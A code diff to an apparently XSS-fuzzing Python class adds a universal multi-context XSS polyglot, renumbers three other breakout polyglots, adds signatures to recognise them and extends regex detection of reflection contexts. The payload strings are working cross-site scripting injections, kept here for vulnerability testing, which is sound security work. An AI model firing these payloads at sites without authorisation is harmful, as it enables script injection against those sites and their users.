@@ -32,19 +32,45 @@ class PolyglotTriageEngine:
 
     # Mega-polyglot templates spanning HTML, attr, quotes, JS blocks, and comments
     TRIAGE_POLYGLOTS = [
-        # Canonical multi-context polyglot (HTML / Attr / JS / Comment / SVG / Template)
+        # 1. Somdev Sangwan (@s0md3v) Universal Multi-Context Polyglot (RCDATA / Raw Text / Attr / JS / Comment / SVG / Entity)
+        "%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/{CALLBACK}('{TOKEN}')//\">",
+        # 2. Canonical multi-context polyglot (HTML / Attr / JS / Comment / SVG / Template)
         "-->'\"><script src=data:,{CALLBACK}('{TOKEN}')></script><svg onload={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='`",
-        # Compact attribute and script breakout polyglot
+        # 3. Compact attribute and script breakout polyglot
         "'\">--></script><details open ontoggle={CALLBACK}('{TOKEN}')>\" onfocus={CALLBACK}('{TOKEN}') autofocus='",
-        # Template literal & JS string specialist polyglot
-        "\"';{CALLBACK}('{TOKEN}');//</script><svg/onload={CALLBACK}('{TOKEN}')>`-alert({TOKEN})-"
+        # 4. Template literal & JS string specialist polyglot
+        "\"';{CALLBACK}('{TOKEN}');//</script><svg/onload={CALLBACK}('{TOKEN}')>`-{CALLBACK}('{TOKEN}')-"
     ]
+
+    # Structural signatures that identify a rendered triage polyglot regardless of the token or
+    # callback substituted in. Regular single-context grammar payloads never chain these breakouts,
+    # so a match reliably means "this test case is the triage probe" — used to gate the feedback
+    # loop in the worker and to prioritise the probe in the generator.
+    TRIAGE_SIGNATURES = (
+        "</template></noembed></noscript></style></title></textarea></script>",  # variant 1
+        "<script src=data:,",                                                     # variant 2
+        "<details open ontoggle=",                                                # variant 3
+        "</script><svg/onload=",                                                  # variant 4
+    )
 
     @classmethod
     def get_triage_payload(cls, token: str, callback_name: str = "__XSS__", variant: int = 0) -> str:
         """Render a mega-polyglot with the given verification token and callback."""
         template = cls.TRIAGE_POLYGLOTS[variant % len(cls.TRIAGE_POLYGLOTS)]
         return template.replace("{TOKEN}", token).replace("{CALLBACK}", callback_name)
+
+    @classmethod
+    def is_triage_payload(cls, payload: Optional[str]) -> bool:
+        """True if ``payload`` is one of our rendered mega-polyglots.
+
+        Signature-based (token/callback independent) so it survives the oracle-token rewrite the
+        fuzzer applies before storing a test case. This is the single source of truth for "is this
+        the triage probe?" — both the generator's priority boost and the worker's prune gate use it,
+        replacing the stale ``/*__XSS_POLYGLOT__*/`` marker that no real template ever contained.
+        """
+        if not payload:
+            return False
+        return any(sig in payload for sig in cls.TRIAGE_SIGNATURES)
 
     @classmethod
     def evaluate_triage(
@@ -81,18 +107,33 @@ class PolyglotTriageEngine:
         candidate_contexts: List[str] = []
         token_count = dom_snapshot.count(token)
 
-        # Check for attribute residue
-        if re.search(rf'=\s*["\'][^"\']*{re.escape(token)}', dom_snapshot):
+        # Detect the *surviving* reflection contexts so the caller can fuzz only those grammars
+        # and cancel the rest. Labels intentionally mirror PayloadGenerator.CONTEXT_GRAMMAR_MAP keys
+        # so a residue verdict maps straight onto a grammar file. Order matters: the more specific
+        tok = re.escape(token)
+        if (
+            re.search(rf'\bon\w+\s*=\s*"[^"]*{tok}', dom_snapshot, re.IGNORECASE)
+            or re.search(rf"\bon\w+\s*=\s*'[^']*{tok}", dom_snapshot, re.IGNORECASE)
+            or re.search(rf'\bon\w+\s*=\s*[^"\'\s>]*{tok}', dom_snapshot, re.IGNORECASE)
+        ):
+            candidate_contexts.append("EVENT_HANDLER_ATTR")
+        if re.search(rf'=\s*["\'][^"\']*{tok}', dom_snapshot):
             candidate_contexts.append("ATTR_QUOTED")
-        if re.search(rf'<script[^>]*>[^<]*{re.escape(token)}', dom_snapshot, re.IGNORECASE):
+        if re.search(rf'=\s*[^"\'\s>]*{tok}', dom_snapshot):
+            candidate_contexts.append("ATTR_UNQUOTED")
+        if re.search(rf'<script[^>]*>[^<]*{tok}', dom_snapshot, re.IGNORECASE):
             candidate_contexts.append("JS_STRING_LITERAL")
-        if re.search(rf'<!--[^\-]*{re.escape(token)}', dom_snapshot):
+        if re.search(rf'`[^`]*{tok}', dom_snapshot):
+            candidate_contexts.append("TEMPLATE_LITERAL")
+        if re.search(rf'<!--[^\-]*{tok}', dom_snapshot):
             candidate_contexts.append("HTML_COMMENT")
-        if re.search(rf'<style[^>]*>[^<]*{re.escape(token)}', dom_snapshot, re.IGNORECASE):
+        if re.search(rf'<style[^>]*>[^<]*{tok}', dom_snapshot, re.IGNORECASE):
             candidate_contexts.append("CSS_STYLE_BLOCK")
-        if re.search(rf'>[^<]*{re.escape(token)}[^<]*<', dom_snapshot):
+        if re.search(rf'>[^<]*{tok}[^<]*<', dom_snapshot):
             candidate_contexts.append("HTML_TEXT")
 
+        # De-duplicate while preserving detection order.
+        candidate_contexts = list(dict.fromkeys(candidate_contexts))
         if not candidate_contexts:
             candidate_contexts.append("HTML_TEXT")
 
